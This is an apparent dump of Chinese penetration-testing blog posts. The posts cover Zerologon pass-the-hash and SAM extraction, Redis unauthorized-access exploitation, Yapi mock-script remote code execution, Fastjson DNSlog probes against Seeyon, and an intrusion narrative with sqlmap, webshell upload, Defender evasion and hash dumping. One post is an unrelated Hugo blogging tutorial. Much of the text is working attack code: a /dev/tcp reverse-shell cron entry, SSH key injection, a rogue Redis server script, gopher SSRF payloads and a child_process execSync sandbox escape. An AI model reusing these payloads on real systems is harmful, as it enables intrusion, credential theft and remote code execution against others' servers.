Hash:\nrootkit.org\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c:::\r 通过 wmic hash 传递获取shell：\npython3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c rootkit.org/Administrator@10.99.99.253\r 通过导出 sam system 等文件到本地，获取域控机器上本地保存之前的 hash 值用于恢复，不然就脱域了：\n备份注册表\n导出注册表文件\rreg save HKLM\\SYSTEM system.save\rreg save HKLM\\SAM sam.save\rreg save HKLM\\SECURITY security.save\r将文件下载到本地\rget system.save\rget sam.save\rget security.save\r删除文件\rdel /f system.save\rdel /f sam.save\rdel /f security.save\r 之后你会发现再你的当前机器会生成几个文件：sam.save、security.save、system.save\n之后通过 sam.save、security.save、system.save 这些文件获得原来域控机器上的 Ntlm Hash 值，用于恢复密码：\npython3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL\r 通过拿到 $MACHINE.ACC: 的值，然后进行恢复(注意只有后半部分)\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7e304360db8cdb95d09a960607fcc526\r 恢复密码\npython3 reinstall_original_pw.py OWA2013 10.99.99.253 7e304360db8cdb95d09a960607fcc526\r 验证是否恢复密码成功\npython3 secretsdump.py rootkit/OWA2013\\$@10.99.99.253 -just-dc -no-pass\r ","id":57,"section":"posts","summary":"漏洞介绍 2020年08月12日，Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏","tags":["域渗透","内网渗透"],"title":"NetLogon 域内提权漏洞（CVE-2020-1472）","uri":"https://ad-calcium.github.io/2021/07/%E5%9F%9F%E6%B8%97%E9%80%8F-netlogon-%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2020-1472/","year":"2021"},{"content":"Redis介绍 Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库。\n安装教程\n第1步：Redis下载\rwget http://download.redis.io/releases/redis-3.2.11.tar.gz\r第2步：Redis解压、编译\rtar zxvf redis-3.2.11.tar.gz\rcd redis-3.2.11\rmake #编译失败也可以的，不影响\rmake install\r进入 redis.conf 文件，还原漏洞现场，修改配置文件\r vim redis.conf 新版中这里是127.0.0.1，将他注释掉或者改为0.0.0.0\n将保护模式改为no\n完成之后启动服务\nredis-server redis.conf 启动服务\rredis-cli shutdown 关闭服务\r 关闭防火墙命令： service iptables stop 永久关闭防火墙：chkconfig iptables off\n永久有效：修改/etc/sysconfig/selinux 将SELINUX=enforcing，改为SELINUX=disabled。然后重启 即时有效：setenforce 0\n在kali下安装redis-cli\nwget http://download.redis.io/releases/redis-2.8.12.tar.gz 下载\rtar -xzf redis-2.8.12.tar.gz # 解压\rcd redis-2.8.12 #cd进入redis目录\rmake #make安装\r进入src目录\rcd src\r./redis-cli -h 如果这个命令出现帮助界面说明可以正常使用\r连接靶机\r./redis-cli -h 192.168.62.137 -p 6379\r 尝试输入命令info，可以成功执行\n查看所有秘钥（我这表示为空，没有秘钥）\nkeys *\r 攻击利用 写入文件 设置路径，把shell写入到网站根目录下（/var/www/html/）\rCONFIG SET dir /var/www/html/\r修改备份文件名\rCONFIG SET dbfilename 1.php\r写入内容\rSET webshell \u0026quot;\u0026lt;?php phpinfo();?\u0026gt;\u0026quot;\rsave\r 查看是否写入成功\n反弹shell 在kali里开启监听\nnc -lvvp 9999\nset shell \u0026quot;\\n\\n*/1 * * * * /bin/bash -i\u0026gt;\u0026amp;/dev/tcp/192.168.239143/9999 0\u0026gt;\u0026amp;1\\n\\n\u0026quot;\rconfig set dir /var/spool/cron\rconfig set dbfilename root\rsave\r 等待一分钟，kali已经成功接收shell\n通过写入SSH公钥实现SSH登录 原理就是在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生一个授权的key。\n在kali生成ssh公钥 (一路回车即可) ssh-keygen -t rsa\n查看id_rsa.pub\ncat /root/.ssh/id_rsa.pub\r 执行redis命令\nconfig set dir /root/.ssh/\rconfig set dbfilename authorized_keys\rset x \u0026quot;\\n\\n\\nssh-rsa 这里填id_rsa.pub的内容 root@kali\\n\\n\\n\u0026quot;\rsave\r清空数据库\rFLUSHALL\r Redis主从复制getshell 原理： 利用主从特性传输数据，通过模块加载，增加执行命令的函数。\n下载镜像 docker pull damonevking/redis5.0\n映射端口并运行容器 docker run -p 6379:6379 -d damonevking/redis5.0 redis-server \n自动化工具 exp下载地址： redis-rce redis-rogue-server\n环境编译\ngit clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\rcd RedisModules-ExecuteCommand/\rmake\rgit clone https://github.com/Ridter/redis-rce.git\rcd redis-rce/\rcp ../RedisModules-ExecuteCommand/src/module.so ./\rpip install -r requirements.txt python redis-rce.py -r 136.244.70.243（目标ip) -L 136.244.70.243（自己的ip） -f module.so\r python3 redis-rce.py -r 136.244.70.243（目标ip) -L 136.244.70.243（自己的ip） -f exp.so\n手动 利用docker开启2台redis容器用于复现主从复制。\n下载镜像 docker pull damonevking/redis5.0\n映射端口并运行容器\ndocker run -p 6379:6379 -d damonevking/redis5.0 redis-server\rdocker run -p 6666:6379 -d --name redis-service-3 damonevking/redis5.0\r 首先进入主redis\nset webshell \u0026quot;\u0026lt;?php phpinfo();?\u0026gt;\u0026quot;\rget webshell\r 在本地 redis 设置远程服务器 redis 服务器为主服务器，同步远程服务器 redis 的内容\nslaveof 192.168.72.196 6379\rrole\rget shell\r 写shell\nconfig set dir /data/\rconfig set dbfilename 11.txt\rsave\r 关闭同步\rSLAVEOF NO ONE\r清除缓存\rflushall\r 编写脚本，构造恶意Redis服务器，监听本地端口1234，加载exp.so。 python RogueServer.py \u0026ndash;lport 1234 \u0026ndash;exp exp.so\nconfig set dir ./ #设置redis的备份路径为当前目录\rconfig set dbfilename exp.so #设置备份文件名为exp.so，默认为dump.rdb\rslaveof 192.168.172.129 1234 #设置主服务器IP和端口\rmodule load ./exp.so #加载恶意模块\rslaveof no one #切断主从，关闭复制功能\rsystem.exec 'whoami' #执行系统命令\rsystem.rev 127.0.0.1 9999 config set dbfilename dump.rdb #通过dump.rdb文件恢复数据\rsystem.exec 'rm ./exp.so' #删除exp.so\rmodule unload system #卸载system模块的加载\r 成功执行系统命令\nRedis服务端模拟脚本\nimport socket\rfrom time import sleep\rfrom optparse import OptionParser\rdef RogueServer(lport):\rresp = \u0026quot;\u0026quot;\rsock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\rsock.bind((\u0026quot;0.0.0.0\u0026quot;,lport))\rsock.listen(10)\rconn,address = sock.accept() sleep(5)\rwhile True: data = conn.recv(1024)\rif \u0026quot;PING\u0026quot; in data:\rresp=\u0026quot;+PONG\u0026quot;+CLRF\rconn.send(resp)\relif \u0026quot;REPLCONF\u0026quot; in data:\rresp=\u0026quot;+OK\u0026quot;+CLRF\rconn.send(resp)\relif \u0026quot;PSYNC\u0026quot; in data or \u0026quot;SYNC\u0026quot; in data:\rresp = \u0026quot;+FULLRESYNC \u0026quot; + \u0026quot;Z\u0026quot;*40 + \u0026quot; 1\u0026quot; + CLRF\rresp += \u0026quot;$\u0026quot; + str(len(payload)) + CLRF\rresp = resp.encode()\rresp += payload + CLRF.encode()\rif type(resp) != bytes:\rresp =resp.encode() conn.send(resp) #elif \u0026quot;exit\u0026quot; in data:\rbreak\rif __name__==\u0026quot;__main__\u0026quot;:\rparser = OptionParser() parser.add_option(\u0026quot;--lport\u0026quot;, dest=\u0026quot;lp\u0026quot;, type=\u0026quot;int\u0026quot;,help=\u0026quot;rogue server listen port, default 21000\u0026quot;, default=21000,metavar=\u0026quot;LOCAL_PORT\u0026quot;) parser.add_option(\u0026quot;-f\u0026quot;,\u0026quot;--exp\u0026quot;, dest=\u0026quot;exp\u0026quot;, type=\u0026quot;string\u0026quot;,help=\u0026quot;Redis Module to load, default exp.so\u0026quot;, default=\u0026quot;exp.so\u0026quot;,metavar=\u0026quot;EXP_FILE\u0026quot;) (options , args )= parser.parse_args()\rlport = options.lp\rexp_filename = options.exp\rCLRF=\u0026quot;\\r\\n\u0026quot;\rpayload=open(exp_filename,\u0026quot;rb\u0026quot;).read()\rprint \u0026quot;Start listing on port: %s\u0026quot; %lport\rprint \u0026quot;Load the payload: %s\u0026quot; %exp_filename RogueServer(lport)\r SSRF+Redis 反弹shell 参照Redis手动getshell的过程，可轻易实现SSRF+Redis反弹shell。\n以curl为例，漏洞代码为ssrf.php:\n\u0026lt;?php\r$ch = curl_init();\rcurl_setopt($ch, CURLOPT_URL, $_GET['url']);\r#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\rcurl_setopt($ch, CURLOPT_HEADER, 0);\r#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);\rcurl_exec($ch);\rcurl_close($ch);\r?\u0026gt;\r 环境准备： 模拟内网未授权Redis服务器：192.168.172.131 模拟攻击者机器：192.168.172.129 在攻击者机器上构建恶意Redis服务器，同时监听本地9999端口等待shell返回。\n1、利用dict协议反弹shell\n#查看当前redis的相关配置\rssrf.php?url=dict://192.168.172.131:6379/info\r#设置备份文件名\rssrf.php?url=dict://192.168.172.131:6379/config:set:dbfilename:exp.so\r#连接恶意Redis服务器\rssrf.php?url=dict://192.168.172.131:6379/slaveof:192.168.172.129:1234\r#加载恶意模块\rssrf.php?url=dict://192.168.172.131:6379/module:load:./exp.so\r#切断主从复制\rssrf.php?url=dict://192.168.172.131:6379/slaveof:no:one\r#执行系统命令\rssrf.php?url=dict://192.168.172.131:6379/system.rev:192.168.172.129:9999\r 2、利用gopher协议反弹shell\n#设置文件名，连接恶意Redis服务器\rgopher://192.168.172.131:6379/_config%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.172.129%25201234%250d%250aquit\r#加载exp.so，反弹shell\rgopher://192.168.172.131:6379/_module%2520load%2520./exp.so%250d%250asystem.rev%2520192.168.172.129%25209999%250d%250aquit\r 3、利用这两种协议，都可以成功获取shell。\n","id":58,"section":"posts","summary":"Redis介绍 Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库。 安装教程 第1步","tags":["漏洞复现","未授权"],"title":"redis未授权","uri":"https://ad-calcium.github.io/2021/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/","year":"2021"},{"content":"0x01 漏洞介绍 Yapi 由 YMFE开源，旨在为开发、产品、测试人员提供更优雅的接口管理服务，可以帮助开发者轻松创建、发布、维护API。\n安全人员在Yapi官方Github仓库提交了漏洞issues，地址为:https://github.com/YMFE/yapi/issues/2233。\n0x02 漏洞描述 YAPI接口管理平台是国内某旅行网站的大前端技术中心开源项目，使用mock数据/脚本作为中间交互层，为前端后台开发与测试人员提供更优雅的接口管理服务，该系统被国内较多知名互联网企业所采用。\nYApi 是高效、易用、功能强大的 api 管理平台。但因为大量用户使用 YAPI的默认配置并允许从外部网络访问 YApi服务，导致攻击者注册用户后，即可通过 Mock功能远程执行任意代\n0x03 FOFA语句 app=\u0026quot;YApi\u0026quot;\ricon_hash=\u0026quot;-715193973\u0026quot;\r 0x03 Yapi部署教程 使用Docker构建Yapi(Ubuntu环境)。\n启动mongodb。\ndocker run -d --name mongo-yapi -p 27017:27017 mongo\r 获取 Yapi 镜像，版本信息可在 阿里云镜像仓库查看\ndocker pull registry.cn-hangzhou.aliyuncs.com/anoy/yapi\r 自定义配置文件挂载到目录/api/config.json，宿主机/config/config.json 内容为以下代码：\n{\r\u0026quot;port\u0026quot;: \u0026quot;3000\u0026quot;,\r\u0026quot;adminAccount\u0026quot;: \u0026quot;admin@qq.com\u0026quot;,\r\u0026quot;db\u0026quot;: {\r\u0026quot;servername\u0026quot;: \u0026quot;mongo-yapi\u0026quot;,\r\u0026quot;DATABASE\u0026quot;: \u0026quot;yapi\u0026quot;,\r\u0026quot;port\u0026quot;: 27017\r},\r\u0026quot;mail\u0026quot;: {\r\u0026quot;enable\u0026quot;: true,//邮件通知\r\u0026quot;host\u0026quot;: \u0026quot;smtp.qq.com\u0026quot;,//邮箱服务器\r\u0026quot;port\u0026quot;: 465,\r\u0026quot;from\u0026quot;: \u0026quot;admin@qq.com\u0026quot;,//发件人邮箱\r\u0026quot;auth\u0026quot;: {\r\u0026quot;user\u0026quot;: \u0026quot;adminadmin@qq.com\u0026quot;,//邮箱服务器账号\r\u0026quot;pass\u0026quot;: \u0026quot;123456\u0026quot;//邮箱服务器密码\r}\r}\r}\r 初始化Yapi数据库索引及管理员账号。\n\rdocker run -it --rm \\\r-v /config/config.json:/api/config.json \\\r--link mongo-yapi:mongo \\\r--entrypoint npm \\\r--workdir /api/vendors \\\rregistry.cn-hangzhou.aliyuncs.com/anoy/yapi \\\rrun install-server\r 启动Yapi服务。\n\rdocker run -d \\\r-v /config/config.json:/api/config.json \\\r--name yapi \\\r--link mongo-yapi:mongo \\\r--workdir /api/vendors \\\r-p 3000:3000 \\\rregistry.cn-hangzhou.aliyuncs.com/anoy/yapi \\\rserver/app.js\r 访问http://localhost:3000登录账号admin@qq.com，密码 123456。\n漏洞利用 注册用户 利用前提为Yapi开启了注册功能，打开靶机地址，注册一个账号。\n添加项目 添加一个项目。 输入项目名称，输入完成后点击创建名称 添加接口 点击添加接口 输入接口名称和接口路径，输入完成后点击提交 添加Mock脚本 点击高级Mock，并打开脚本页面 开启脚本，输入Mock脚本\n脚本内容:\nconst sandbox = this\rconst ObjectConstructor = this.constructor\rconst FunctionConstructor = ObjectConstructor.constructor\rconst myfun = FunctionConstructor('return process')\rconst process = myfun()\rmockJson = process.mainModule.require(\u0026quot;child_process\u0026quot;).execSync(\u0026quot;whoami\u0026quot;).toString()\r 点击保存，打开预览界面。访问Mock地址即可执行命令。 访问Mock地址 成功获取当前用户\n可将Mock脚本中的whoami改成任意语句，可执行反弹shell等操作。\n修复建议 该漏洞暂无补丁。\n临时修复建议：\n  关闭YAPI用户注册功能，以阻断攻击者注册。\n  利用请求白名单的方式限制 YAPI 相关端口。\n  排查 YAPI 服务器是否存在恶意访问记录。\n  切勿非法用途，履行白帽职责。\n批量脚本：https://raw.githubusercontent.com/ad-calcium/vuln_script/main/Yapi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.py\n","id":59,"section":"posts","summary":"0x01 漏洞介绍 Yapi 由 YMFE开源，旨在为开发、产品、测试人员提供更优雅的接口管理服务，可以帮助开发者轻松创建、发布、维护API。 安全人员在Yapi","tags":["漏洞复现","web安全"],"title":"Yapi远程命令执行漏洞","uri":"https://ad-calcium.github.io/2021/07/yapi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","year":"2021"},{"content":"0x01 影响范围 V7.1、V7.1SP1\nV7.0、V7.0SP1、V7.0SP2、V7.0SP3\nV6.1、V6.1SP1、V6.1SP2\nV6.0、V6.0SP1\nV5.6、V5.6SP1\n0x02 漏洞搜索 搜索语法\nFOFA：\u0026quot;seeyon\u0026quot; \u0026amp;\u0026amp; after=\u0026quot;2021-05-01\u0026quot;\r 0x03 漏洞检测 Jndi影响范围：\n1、rmi的利用方式：适用jdk版本：JDK 6u132、JDK 7u122、JDK 8u113之前\n2、ldap的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前\n区分FastJson与Jackson：\n1）不闭合花括号看报错信息方法\n2）减少参数方法\n{\u0026ldquo;name\u0026rdquo;:\u0026ldquo;S\u0026rdquo;, \u0026ldquo;age\u0026rdquo;:21}//Fastjson 是不会报错\n{\u0026ldquo;name\u0026rdquo;:\u0026ldquo;S\u0026rdquo;, \u0026ldquo;age\u0026rdquo;:21,\u0026ldquo;xxx\u0026rdquo;:123}// Jackson 语法相对比较严格,会报错\n3）fastjson报错关键词:\ncom.alibaba.fastjson.JSONException , 触发方式如下\n{\u0026ldquo;x\u0026rdquo;:\u0026quot;\n[\u0026ldquo;x\u0026rdquo;:1]\n{\u0026ldquo;x\u0026rdquo;:{\u0026quot;@type\u0026quot;:\u0026ldquo;java.lang.AutoCloseable\u0026rdquo;\nDNS探测方法：\n注意：Content-Type: application/json\n# 未报错poc\r{\u0026quot;x\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;java.net.InetSocketAddress\u0026quot;{\u0026quot;address\u0026quot;:,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;}}}\r{\u0026quot;x\u0026quot;:{{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}:\u0026quot;x\u0026quot;}}\r{\u0026quot;x\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;com.alibaba.fastjson.JSONObject\u0026quot;, {\u0026quot;@type\u0026quot;: \u0026quot;java.net.URL\u0026quot;, \u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}}\u0026quot;\u0026quot;}}\r# 报错,但仍有效\r{\u0026quot;x\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;java.net.Inet4Address\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;}}\r{\u0026quot;x\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;java.net.Inet6Address\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;}}\r{\u0026quot;x\u0026quot;:Set[{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}]}\r# 报错,且返回400,但仍有效\r{\u0026quot;x\u0026quot;:Set[{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}}\r{\u0026quot;x\u0026quot;:{{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}:0}\r 0x04 漏洞复现 1.使用dnslog验证漏洞, 打开http://www.dnslog.cn获取域名\n漏洞POC\nPOST /seeyon/main.do?method=changeLocale HTTP/1.1\rHost: xxxxx\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\rAccept-Encoding: gzip, deflate\rConnection: close\rUpgrade-Insecure-Requests: 1\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 71\r_json_params={\u0026quot;@type\u0026quot;:\u0026quot;java.net.Inet4Address\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;qn94mq.dnslog.cn\u0026quot;}\r 3.将上面的代码放到BurpSuite中，然后设置好对应的HOST和端口。\n查看dnslog 成功回显, 说明存在漏洞\n","id":60,"section":"posts","summary":"0x01 影响范围 V7.1、V7.1SP1 V7.0、V7.0SP1、V7.0SP2、V7.0SP3 V6.1、V6.1SP1、V6.1SP2 V6.0、","tags":["漏洞复现"],"title":"致远伪0day-FastJson利用链","uri":"https://ad-calcium.github.io/2021/07/%E8%87%B4%E8%BF%9C%E4%BC%AA0day-fastjson%E5%88%A9%E7%94%A8%E9%93%BE/","year":"2021"},{"content":"1、hugo hugo是基于命令行的静态网站生成工具，使用go语言开发。因此，下载编译好的二进制文件，就可以直接运行，无需安装其它依赖。将hugo添加到环境变量，更便于使用。\nhugo源码地址：hugo github\n常用命令列表 通过hugo help命令可以获取hugo命令行的帮助文档。\nhugo new site 创建一个新的网站(骨架), 例如: hugo new site myblog，他会在当前目录下创建一个myblog的文件夹，并在其中填充必须的必须的目录和文件。\n下面是myblog文件夹的结构：\n├─archetypes\r├─content\r├─data\r├─layouts\r├─resources\r│ └─_gen\r│ ├─assets\r│ └─images\r├─static\r└─themes\r└─study-theme\r├─archetypes\r├─layouts\r│ ├─partials\r│ └─_default\r└─static\r├─css\r└─js\r hugo new 添加网站内容. 例如: hugo new about.md，他会在content目录下生成一个about.md的文件，根据这个文件可以生成对应的静态页面。可以在about.md前面添加对应的路径，但文件会以content为根目录，也就是说所有添加新文件都会存放在content目录下面。\nhugo new theme 为网站添加UI，也就是模板文件/主题文件。例如: hugo new theme mytheme。这会在themes目录下创建一个mytheme目录，mytheme目录中会默认添加一些基本的文件结构。所有的模板/主题文件都会保存在themes目录中。\nhugo hugo本身就是一个命令，他的作用就是生成静态网站，默认在生成的静态文件保存在public目录中，也可以指定路径。\nhugo server hugo自带一个web服务器，运行hugo server后可以通过 http://localhost:1313 来访问静态网站。\n下面是hugo server常用的参数, 注意大小写:\n-p 端口: 修改默认端口\n-D: 在使用server预览网站时，draft属性为ture的草稿文件是不会生成预览的，添加-D后可以预览草稿文件。\n2、hugo theme hugo theme的下载地址：hugo themes\n我这里选择用的是[hugo-theme-pure]https://github.com/xiaoheiAh/hugo-theme-pure\n用这个的原因是：界面比较简洁、有文章归档、有关键词搜索（这个我很需要）\n3、使用hugo Page Bundles 文档地址：Page Bundles\nPage Bundles 简单来说就是可以把md文件和图片置于同一个目录下（正常引用图片需要放在static目录下），其中images目录保存index.md所有引用图片。这样做的好处是，方便以后查找和做导出。\n4、编辑博客内容 使用markdown编辑文本，放在content目录下。\n5、本地生成 生成静态网页到public目录下：\n hugo\n 运行本地web服务：\n hugo server\n 6、部署到github 6.1 新建项目 创建github仓库，Repository name 是 用户名.github.io：\n其他的默认即可\n项目建立成功\n6.2 生成ssh公钥 ssh-keygen -t rsa -C \u0026quot;xxxx@qq.com\u0026quot;\r 查看(根据自己生成结果，查看相应的公钥)\ncat /c/Users/admin/.ssh/id_rsa.pub\r 6.3 将公钥上传到GitHub 点击新建ssh key\n将生成号的公钥复制到这里\n设置好之后，具体如下\n在git中设置邮箱地址和用户名\n git config --global user.email \u0026quot;you@example.com\u0026quot;\rgit config --global user.name \u0026quot;Your Name\u0026quot;\r 初始化仓库\ngit init\r 将所有内容添加到git\ngit add .\r 提交到git 本地\ngit commit -m \u0026quot;我的博客第一次提交\u0026quot;\r 关联到远程git，注意这里需要写你自己的git 地址\ngit remote add origin git@github.com:ad-calcium/ad-calcium.github.io.git\r 推送到远程git\ngit push origin master\r 如果报错\ngit pull --rebase origin master\r 自动化部署脚本：\n#!/bin/bash\r# 部署到 github pages 脚本\r# 错误时终止脚本\rset -e\r# 删除打包文件夹\r# rm -rf public\r# 打包\rhugo --baseUrl=\u0026quot;https://far-morningstar.github.io/\u0026quot;\r# 进入打包文件夹\rcd public\r# Add changes to git，第一提交需要 git init\r# git init\rgit add .\r# Commit changes.\rmsg=\u0026quot;building site `date`\u0026quot;\rif [ $# -eq 1 ]\rthen msg=\u0026quot;$1\u0026quot;\rfi\rgit commit -m \u0026quot;$msg\u0026quot;\r# 添加远程仓库\rgit remote add origin git@github.com:ad-calcium/ad-calcium.github.io.git\r# 推送到github git push -u origin master\r# 回到原文件夹\rcd ..\r 我这里使用的是windows系统，安装Cmder，可以执行bash脚本：\n","id":61,"section":"posts","summary":"1、hugo hugo是基于命令行的静态网站生成工具，使用go语言开发。因此，下载编译好的二进制文件，就可以直接运行，无需安装其它依赖。将hu","tags":["安装博客"],"title":"hugo搭建个人博客","uri":"https://ad-calcium.github.io/2020/07/hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","year":"2020"},{"content":"记一次SQL注入引发的日志分析案例 ++++\nauthor = \u0026ldquo;AD钙奶\u0026rdquo; title = \u0026ldquo;记一次SQL注入引发的日志分析案例\u0026rdquo; date = \u0026ldquo;2023-01-16\u0026rdquo; lastmod = \u0026ldquo;2023-01-16\u0026rdquo; description = \u0026ldquo;站撸下来之后，发现被入侵了，接着一波日志分析\u0026rdquo; tags = [ \u0026ldquo;渗透测试\u0026rdquo;, ] categories = [ \u0026ldquo;渗透测试\u0026rdquo;, ] series = [\u0026ldquo;web dev\u0026rdquo;] aliases = [\u0026ldquo;dev\u0026rdquo;]\n+++\n‍\n外网渗透 　通过awvs，发现存在注入一枚，sqlmap一把梭哈，没梭哈成功的说明姿势不对\nsqlmap -r 222.txt --batch --random-agent --force-ssl --current-db\r 　跑出来的注入类型还挺多的\nParameter: MULTIPART #1* ((custom) POST)\rType: boolean-based blind\rTitle: Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)\rPayload: ------------YWJkMTQzNDcw\rContent-Disposition: form-data; name=\u0026quot;__VIEWSTATE\u0026quot;\rType: error-based\rTitle: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)\rPayload: ------------YWJkMTQzNDcw\rContent-Disposition: form-data; name=\u0026quot;__VIEWSTATE\u0026quot;\rType: stacked queries\rTitle: Microsoft SQL Server/Sybase stacked queries (comment)\rPayload: ------------YWJkMTQzNDcw\rType: time-based blind\rTitle: Microsoft SQL Server/Sybase time-based blind (IF)\rPayload: ------------YWJkMTQzNDcw\r------------YWJkMTQzNDcw\rContent-Disposition: form-data; name=\u0026quot;ctl00$ContentPlaceHolder1$c_email\u0026quot;\r-1' WAITFOR DELAY '0:0:5'-- diLH\r------------YWJkMTQzNDcw--\r 　　可以os-shell(不过我这个图是后补的，入口是朋友打的，我就没看)\n　​​\n　‍\n　数据库为sqlserver，尝试读取网站后台账户密码\nsqlmap -r 222.txt --batch --random-agent --force-ssl -D ein -T Apply_user --dump --start=1 --stop=10　 　虽然读出来了，但是好几个用户登录不进去，一个一个尝试发现了一个用户可以登录后台\n　‍\n　‍\n　登录后台\n　‍\n　‍\n　‍\n　‍\n　在后台寻找上传的功能点，疑似发现一个上传点\n　‍　　发现了好几个上传点，但是都不回显路径。后台在最下面的档案上传找到了回显位置（目标及其上有defender，这里还折腾了一会。可通过github上的生成器，生成一个马儿，这样可以过defender）\n　‍\n　上传webshell成功获取路径\n　　‍\n内网渗透 　因为是iis启动的，所以权限比较低，通过哥斯拉的shellcode加载上线\n　​​\n　通过烂土豆直接提权\n　由于目标的操作系统是win2016，所以无法抓到明文密码\n\t* Username : fxxxxdm\r* Domain : ExxxxEB\r* NTLM : f5f070xxxxxf714ca44e\r* SHA1 : 7064xxxxxxx1f0e47f183b\r* Username : pxxxxck\t* Domain : EIN-WEB\r* NTLM : 1ecd8xxxxx5af5cd672a9a\r* SHA1 : c44812axxxeda558ea7509f23c8\r 　‍\n定位网站路径，找一下数据库，一般是web.config\nC:/web/ein/\r 　数据库配置文件\n　‍\n　朋友A又上传了frp，又对内网一波梭哈，拿着口令了内网的一个弱口令\n　通过MDUT直接执行命令，虽然权限比较低，但是问题不大\n　‍\n　查看了当前的用户，发现另外一个机器上也存在这几个用户，由于目标机器上开了防火墙和defender导致远程执行命令的工具用不了，那还是老老实实上线cs吧\n　‍\n　‍\n　原本想通过MDUT直接上传文件的，发现无法上传，那还是老老实实的通过certutil远程下载吧\n　‍\n　干完坏事记得擦屁股，\n　‍\n　成功上线192.168.88.51这台主机\n　‍\n　接着又是一顿dumphash，发现一个rdp的密码，不过连不上哎\n　内网也没啥东西，后面就没看了\n　‍\n　‍\n　‍\n日志分析 　在浏览目标机器上的文件，发现存在被入侵的痕迹，那很好玩了，分析分析别人是怎么进来的，学习学习，取其精华去其糟粕。\n　当前文件最早创建的时间为：2022/05/07\n　​​\n　‍\n　下载目录里也存在一些文件，例如mimikatz，burp证书、fscan的扫描结果、sqlmap、mimikatz的结果\n　‍\n　​​\n　‍\n　​​\n　‍看完以上这些东西，不是纯纯的大黑客吗，直呼牛逼\n　‍\n　‍\n　查看了用户创建的时间，发现创建时间为:2022/5/7 下午03:19:30\n　​​\n　‍\n　‍\n　大概整理一下信息\n目标机器：windows 2016\r中间件：iis 10\r新建用户时间：2022/5/7 下午 03:19:30\riis日志路径：C:\\inetpub\\logs\\LogFiles\\W3SVC2\r日志：2022/5/04---2022/07/01\r将这段时间的日志拿出来\r 　‍\n　在分析日志之前，首先要去看一下黑客可能通过哪些方法获取目标权限，因为笔者也是通过漏洞进去的，所以得出两种漏洞\n1.SQL注入(os-shell、获取后台密码)\r2.文件上传\r 　‍\n　大概梳理一下现在接口的漏洞\n注入接口：https://xxxxxx/xxxxtivity.aspx?area=1\r登录接口：https://xxx.xxx.xxxx/login/Login.aspx\r登录成功接口：https://xxx.xxx.xxxx/xxxxx.aspx\r上传文件功能：https://xxx.xxx.xxxx/xxxxxin.aspx\r上传接口：https://xxx.xxx.xxxx/login/xxxxx?id=1\r上传之后的路径：https://xxx.xxx.xxxx/xxxxxx.aspx\r 　‍\n　目标新建用户的时间为2022.5.7，先将2022.5.6的日志拿出来看一下，发现172.104.167.181 ip请求了上传接口，接着把172.104.167.181的所有日志提取出来\n　‍\n　‍\n　通过查询日志可知，黑客通过文件上传漏洞上传完webshell\n　‍\n　‍\n　‍\n　通过https://www.ipshudi.com/172.104.167.181.htm​查询了172.104.167.181的ip地址，应该是代理服务器\n　​​\n　‍\n　因为上传接口是后台的，所以肯定会有登录后台的操作，在2022-05-06 02:59:01​前发现黑客做了上传操作，那登录肯定是之前登录的，把上传webshell之前的日志拿出来分析\n　通过查找login/Main.aspx​接口，发现疑似目标ip\n　‍\n　https://www.ipshudi.com/112.97.50.66.htm\n　猜测这里黑客是没做代理的，这个大几率是他真实ip\n　​​\n　‍\n　接着将该ip所有的日志都提取出来\n　‍\n　